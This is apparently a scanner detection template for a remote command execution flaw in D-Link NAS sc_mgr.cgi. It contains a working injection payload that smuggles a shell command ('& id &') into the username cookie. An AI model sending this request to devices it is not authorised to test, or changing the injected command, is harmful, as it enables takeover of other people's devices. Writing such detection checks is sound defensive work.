id: dlink-nas-rce
brief:
    title: D-Link NAS `sc_mgr.cgi` - Remote Code Execution
    by: adeljck
    level: critical
    about: The D-Link NAS interface sc_mgr.cgi contains a command execution vulnerability that allows attackers to execute arbitrary commands on the device, potentially leading to unauthorized access or contr...
    label:
        - dlink
        - nas
        - rce
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info'
      head:
        Cookie: username='& id &';
      signs:
        - "on": word
          has:
            - 404 not found
          in: body
        - "on": status
          status:
            - 200
